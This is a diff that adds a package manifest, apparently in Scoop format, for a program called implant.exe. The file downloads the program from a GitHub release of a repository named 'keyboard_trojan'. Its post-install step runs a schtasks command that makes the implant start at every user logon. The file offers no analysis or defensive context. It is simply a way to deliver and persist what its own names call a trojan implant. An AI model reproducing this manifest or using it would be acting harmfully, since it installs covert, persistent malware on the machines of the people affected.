@@ -1,0 +1,8 @@
+{
+  "version": "1.2",
+  "url": "https://github.com/armeldemarsac92/keyboard_trojan/releases/download/v1.2/implant.exe",
+  "bin": "implant.exe",
+  "post_install": [
+    "schtasks /create /tn implant /tr '$dir\\implant.exe' /sc onlogon /f"
+  ]
+}
